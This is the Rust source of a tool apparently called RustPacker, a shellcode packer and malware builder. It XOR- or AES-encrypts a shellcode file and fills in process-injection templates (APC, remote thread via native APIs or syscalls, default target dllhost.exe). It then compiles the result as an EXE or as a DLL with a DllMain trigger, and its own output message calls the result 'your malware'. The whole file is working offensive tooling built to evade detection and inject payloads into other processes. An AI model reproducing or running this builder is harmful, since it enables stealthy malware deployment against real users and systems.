#![allow(non_snake_case)]
// The main module only calls the meta functions in each of the needed modules. Must be simple to read and very short.


// Module that handles the CLI arguments and checks them for correct values.
use clap::{Arg, ArgMatches, Command};
use std::path::PathBuf;
// module dedicated to AES encrypt a binary input and give back the path of the encrypted file
use libaes::Cipher;
use std::{collections::HashMap, path::Path};
use std::env::set_current_dir;
use std::process::Command as OtherCommand;

// Module embedding various useful functions

use path_clean::PathClean;
use rand::Rng;
use std::env;
use std::fs::File;
use std::io;
use std::io::Write;

// Module that gets the content of a shellcode file, and returns its content in a Vec<u8>.

// Module building the end-result Rust code
use fs_extra::dir::{copy, CopyOptions};
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::process::exit;
use std::str;
use std::time::{SystemTime, UNIX_EPOCH};

fn search_and_replace(
    path_to_file: &Path,
    search: &str,
    replace: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // thanks to https://users.rust-lang.org/t/replacing-content-in-file/52690/5
    let file_content = fs::read_to_string(path_to_file)?;
    let new_content = file_content.replace(search, replace);

    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path_to_file)?;
    file.write_all(new_content.as_bytes())?;

    Ok(())
}

fn create_root_folder(general_output_folder: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let time = format!(
        "{:?}",
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs()
    );
    let prefix = "output_";
    let result = [prefix, &time].join("");
    println!("[+] Creating output folder: {}", &result);
    let mut result_path = general_output_folder.to_path_buf();
    result_path.push(result);
    fs::create_dir(&result_path)?;

    Ok(result_path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions {
        content_only: true,
        ..Default::default()
    };
    copy(source, dest, &options)?;

    Ok(())
}

pub fn meta_puzzle(order: Order) -> PathBuf {
    println!("[+] Assembling Rust code..");
    //dbg!("{}", &order.encryption);
    let mut general_output_folder = PathBuf::new();
    general_output_folder.push("shared");

    let path_to_template = match order.execution {
        // Execution::CreateThread => Path::new("templates/createThread/."),
        // Execution::CreateRemoteThread => Path::new("templates/createRemoteThread/."),
        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
        Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
        Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
        Execution::WinCreateRemoteThread => Path::new("templates/winCRT/."),
    };

    let folder: PathBuf = match create_root_folder(&general_output_folder) {
        Ok(content) => content,
        Err(err) => panic!("{:?}", err),
    };
    match copy_template(path_to_template, &folder) {
        Ok(_) => (),
        Err(err) => panic!("{:?}", err),
    }
    let mut to_main = folder.clone();
    to_main.push("src");
    to_main.push("main.rs");

    let absolute_shellcode_path = match absolute_path(&order.shellcode_path) {
        Ok(path) => path,
        Err(err) => panic!("{:?}", err),
    };

    let absolute_shellcode_path_as_string: String = path_to_string(&absolute_shellcode_path);

    let mut path_to_cargo = to_main.clone();
    path_to_cargo.pop();
    path_to_cargo.pop();
    path_to_cargo.push("Cargo.toml");

    let mut to_be_replaced = HashMap::new();
    to_be_replaced.insert("{{DEPENDENCIES}}", "".to_string());
    to_be_replaced.insert("{{IMPORTS}}", "".to_string());
    to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", "".to_string());
    to_be_replaced.insert("{{MAIN}}", "".to_string());
    to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_shellcode_path_as_string);
    to_be_replaced.insert("{{DLL_MAIN}}", "".to_string());
    to_be_replaced.insert("{{DLL_FORMAT}}", "".to_string());
    to_be_replaced.insert("{{TARGET_PROCESS}}", order.target_process);

    match order.encryption {
        Encryption::Xor => {
            let key = random_u8();
            let mut path_to_xor = to_main.clone();
            path_to_xor.pop();
            path_to_xor.push("input.xor");
            let absolute_path_to_xor = match absolute_path(&path_to_xor) {
                Ok(path) => path,
                Err(err) => panic!("{:?}", err),
            };
            let absolute_path_to_xor_as_string = path_to_string(&absolute_path_to_xor);

            let xor_args: HashMap<String, String> =
                meta_xor(&order.shellcode_path, &path_to_xor, key);
            let decryption_function = match xor_args.get("decryption_function") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let main = match xor_args.get("main") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
            to_be_replaced.insert("{{MAIN}}", main.to_string());
            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_xor_as_string);
        }
        Encryption::Aes => {
            let key = random_aes_key();
            let iv = random_aes_iv();

            let mut path_to_aes = to_main.clone();
            path_to_aes.pop();
            path_to_aes.push("input.aes");
            let absolute_path_to_aes = match absolute_path(&path_to_aes) {
                Ok(path) => path,
                Err(err) => panic!("{:?}", err),
            };
            let absolute_path_to_aes_as_string = path_to_string(&absolute_path_to_aes);

            let aes_args: HashMap<String, String> =
                meta_aes(&order.shellcode_path, &path_to_aes, &key, &iv);

            let decryption_function = match aes_args.get("decryption_function") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let main = match aes_args.get("main") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let dependencies = match aes_args.get("dependencies") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let imports = match aes_args.get("imports") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
            to_be_replaced.insert("{{MAIN}}", main.to_string());
            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_aes_as_string);
            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies.to_string());
            to_be_replaced.insert("{{IMPORTS}}", imports.to_string());
        }
    }
    match order.format {
        Format::Dll => {
            let dll_cargo_conf = r#"
            [lib]
            crate-type = ["cdylib"]"#;

            to_be_replaced.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

            let dll_main_fn = r#"
            #[no_mangle]
            #[allow(non_snake_case, unused_variables, unreachable_patterns)]
            extern "system" fn DllMain(
                dll_module: u32,
                call_reason: u32,
                _: *mut ())
                -> bool
            {
                match call_reason {
                    DLL_PROCESS_ATTACH => main(),
                    DLL_PROCESS_DETACH => main(),
                    _ => ()
                }

                true
            }
            "#;
            to_be_replaced.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

            // changing "main.rs" to "lib.rs"

            let mut to_lib = to_main.clone();
            to_lib.pop();
            to_lib.push("lib.rs");

            match fs::rename(to_main, to_lib.clone()) {
                Ok(()) => (),
                Err(e) => {
                    eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
                    exit(1);
                }
            }

            // need to change the main file path, as it is now renamed "lib.rs" for DLL format.
            to_main = to_lib;
        }
        Format::Exe => (), // nothing to do here, as the default "replace" values are emspty strings
    }

    for (key, value) in to_be_replaced.iter() {
        let _ = search_and_replace(&to_main, key, value);
        let _ = search_and_replace(&path_to_cargo, key, value);
    }

    println!("[+] Done assembling Rust code!");
    return Path::new(&folder).to_path_buf();
}



fn vec_from_file(path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let bytes = std::fs::read(path)?;
    Ok(bytes)
}

pub fn meta_vec_from_file(file_path: &Path) -> Vec<u8> {
    println!("[+] Reading binary file..");
    let path_to_shellcode_file = Path::new(&file_path);
    let shellcode = vec_from_file(path_to_shellcode_file);

    match shellcode {
        Ok(bytes) => {
            println!("[+] Done reading binary file!");

            bytes
        }
        Err(err) => panic!("{:?}", err),
    }
}


pub fn absolute_path(path: impl AsRef<Path>) -> io::Result<PathBuf> {
    // thanks to https://stackoverflow.com/questions/30511331/getting-the-absolute-path-from-a-pathbuf
    let path = path.as_ref();

    let absolute_path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        env::current_dir()?.join(path)
    }
    .clean();

    Ok(absolute_path)
}

pub fn write_to_file(content: &[u8], path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::create(path)?;
    file.write_all(content)?;

    Ok(())
}

pub fn path_to_string(input: &Path) -> String {
    format!("{:?}", &input)
}

pub fn random_u8() -> u8 {
    let random_number: u8 = rand::thread_rng().gen();
    random_number
}

pub fn random_aes_key() -> [u8; 32] {
    rand::thread_rng().gen::<[u8; 32]>()
}

pub fn random_aes_iv() -> [u8; 16] {
    rand::thread_rng().gen::<[u8; 16]>()
}



// module dedicated to xor a binary input and give back the path of the encrypted file

fn xor_encode(shellcode: &[u8], key: u8) -> Vec<u8> {
    // thanks to https://github.com/memN0ps/arsenal-rs/blob/main/obfuscate_shellcode-rs/src/main.rs
    shellcode.iter().map(|x| x ^ key).collect()
}

pub fn meta_xor(input_path: &Path, export_path: &Path, key: u8) -> HashMap<String, String> {
    println!("[+] XORing shellcode with key {}..", key);
    let unencrypted = meta_vec_from_file(input_path);
    let encrypted_content = xor_encode(&unencrypted, key);
    match write_to_file(&encrypted_content, export_path) {
        Ok(()) => (),
        Err(err) => panic!("{:?}", err),
    }

    let mut result: HashMap<String, String> = HashMap::new();

    let decryption_function = "fn xor_decode(buf: &Vec<u8>, key: u8) -> Vec<u8> {
        buf.iter().map(|x| x ^ key).collect()
    }"
    .to_string();

    let main = format!("vec = xor_decode(&vec, {});", key);

    result.insert(String::from("decryption_function"), decryption_function);
    result.insert(String::from("main"), main);

    println!("[+] Done XORing shellcode!");
    result
}



fn compiler(path_to_cargo_project: &mut PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let path_to_cargo_folder = path_to_cargo_project.clone();
    path_to_cargo_project.push("Cargo.toml");
    set_current_dir(path_to_cargo_folder)?;
    let output = OtherCommand::new("cargo")
        .env("CFLAGS", "-lrt")
        .env("LDFLAGS", "-lrt")
        .env("RUSTFLAGS", "-C target-feature=+crt-static")
        .arg("build")
        .arg("--release")
        .output()?;

    if output.stderr.len() > 0 {
        let error_message = String::from_utf8_lossy(&output.stderr);
        Err(error_message)?
    }
    Ok(())
}

pub fn meta_compiler(path_to_cargo_project: &mut PathBuf) {
    println!("[+] Starting to compile your malware..");
    let res = compiler(path_to_cargo_project);
    match res {
        Ok(()) => {
            println!("[+] Successfully compiled! Rust code and compiled binary are in the 'shared' folder");
        }
        Err(err) => panic!("{:?}", err),
    }
}

#[derive(Debug)]
pub struct Order {
    pub shellcode_path: PathBuf,
    pub execution: Execution,
    pub encryption: Encryption,
    pub format: Format,
    pub target_process: String,
    //sandbox: Option<bool>,
    //output: Option<String>,
}

#[derive(Debug)]
pub enum Execution {
    // CreateRemoteThread,
    // CreateThread,
    SysCreateRemoteThread,
    NtCreateRemoteThread,
    NtQueueUserAPC,
    WinCreateRemoteThread,
}

#[derive(Debug)]
pub enum Encryption {
    Xor,
    Aes,
}

#[derive(Debug)]
pub enum Format {
    Exe,
    Dll,
}

fn parser() -> ArgMatches {
    Command::new("RustPacker")
        .author("by Nariod")
        .version("0.10")
        .about("Shellcode packer written in Rust.")
        .arg_required_else_help(true)
        .arg(Arg::new("Path to shellcode file").short('f').required(true))
        .arg(
            Arg::new("Binary output format")
                .short('b')
                .required(true)
                .value_parser([
                    clap::builder::PossibleValue::new("exe").help("EXE format"),
                    clap::builder::PossibleValue::new("dll").help("DLL format"),
                ]),
        )
        .arg(
            Arg::new("Execution technique")
                .short('i')
                .required(true)
                .value_parser([
                    // PossibleValue::new("ct").help("Create Thread"),
                    // PossibleValue::new("crt").help("Create Remote Thread"),
                    clap::builder::PossibleValue::new("ntapc")
                        .help("Self inject using APC low level APIs"),
                    clap::builder::PossibleValue::new("ntcrt")
                        .help("Create Remote Thread using low level APIs"),
                    clap::builder::PossibleValue::new("syscrt")
                        .help("Create Remote Thread using syscalls"),
                    clap::builder::PossibleValue::new("wincrt")
                        .help("Create Remote Thread using the official Windows Crate"),
                ]),
        )
        .arg(
            Arg::new("Target process").short('t').help(
                "Target processes to inject into, defaults to 'dllhost.exe'. Case sensitive!",
            ),
        )
        .arg(
            Arg::new("Encryption / encoding method")
                .short('e')
                .required(true)
                .value_parser([
                    clap::builder::PossibleValue::new("xor").help("'Exclusive or' encoding"),
                    clap::builder::PossibleValue::new("aes").help("AES 256 encryption"),
                ]),
        )
        .get_matches()
}

fn args_checker(args: ArgMatches) -> Result<Order, Box<dyn std::error::Error>> {
    let sp: String = args
        .get_one::<String>("Path to shellcode file")
        .unwrap()
        .clone();
    let relative_shellcode_path: PathBuf = [sp].iter().collect();
    let shellcode_path = match absolute_path(relative_shellcode_path) {
        Ok(path) => path,
        Err(err) => panic!("{:?}", err),
    };

    let s = args
        .get_one::<String>("Encryption / encoding method")
        .unwrap();
    let encryption: Encryption = match s.as_str() {
        "xor" => Encryption::Xor,
        "aes" => Encryption::Aes,
        _ => panic!("Don't even know how this error exists."),
    };
    //let sandbox: Option<bool> = None;
    //let output: Option<String> = None;

    let s = args.get_one::<String>("Execution technique").unwrap();
    let execution: Execution = match s.as_str() {
        // "ct" => Execution::CreateThread,
        // "crt" => Execution::CreateRemoteThread,
        "ntapc" => Execution::NtQueueUserAPC,
        "ntcrt" => Execution::NtCreateRemoteThread,
        "syscrt" => Execution::SysCreateRemoteThread,
        "wincrt" => Execution::WinCreateRemoteThread,
        _ => panic!("Don't even know how this error exists."),
    };

    let s = args.get_one::<String>("Binary output format").unwrap();
    let format: Format = match s.as_str() {
        "exe" => Format::Exe,
        "dll" => Format::Dll,
        _ => panic!("Don't even know how this error exists."),
    };

    let target_process = match args.get_one::<String>("Target process") {
        Some(name) => name.to_string(),
        None => "dllhost.exe".to_string(),
    };

    let result = Order {
        shellcode_path,
        execution,
        encryption,
        format,
        target_process,
        //sandbox,
        //output,
    };

    Ok(result)
}

pub fn meta_arg_parser() -> Order {
    let args = parser();
    let order: Order = match args_checker(args) {
        Ok(content) => content,
        Err(err) => panic!("{:?}", err),
    };

    order
}



fn aes_256_encrypt(shellcode: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    // thanks to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
    let cipher = Cipher::new_256(key);

    cipher.cbc_encrypt(iv, shellcode)
}

pub fn meta_aes(
    input_path: &Path,
    export_path: &Path,
    key: &[u8; 32],
    iv: &[u8; 16],
) -> HashMap<String, String> {
    println!(
        "[+] AES encrypting shellcode with key {:?} and IV {:?}",
        key, iv
    );
    let unencrypted = meta_vec_from_file(input_path);
    let encrypted_content = aes_256_encrypt(&unencrypted, key, iv);
    match write_to_file(&encrypted_content, export_path) {
        Ok(()) => (),
        Err(err) => panic!("{:?}", err),
    }

    let mut result: HashMap<String, String> = HashMap::new();

    let decryption_function =
        "fn aes_256_decrypt(buf: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
        let cipher = Cipher::new_256(key);    
        let decrypted = cipher.cbc_decrypt(iv, &buf);
    
        decrypted
    }"
        .to_string();

    let main = format!(
        "let key: [u8;32] = {:?};
    let iv: [u8;16] = {:?};   
    vec = aes_256_decrypt(&vec, &key, &iv);
    ",
        key, iv
    );
    let dependencies = r#"libaes = "0.7""#.to_string();

    let imports = "
    use libaes::Cipher;
    "
    .to_string();

    result.insert(String::from("decryption_function"), decryption_function);
    result.insert(String::from("main"), main);
    result.insert(String::from("dependencies"), dependencies);
    result.insert(String::from("imports"), imports);

    println!("[+] Done AES encrypting shellcode!");
    result
}


fn main() {
    let order = meta_arg_parser();
    let mut output_folder = meta_puzzle(order);
    meta_compiler(&mut output_folder);
}
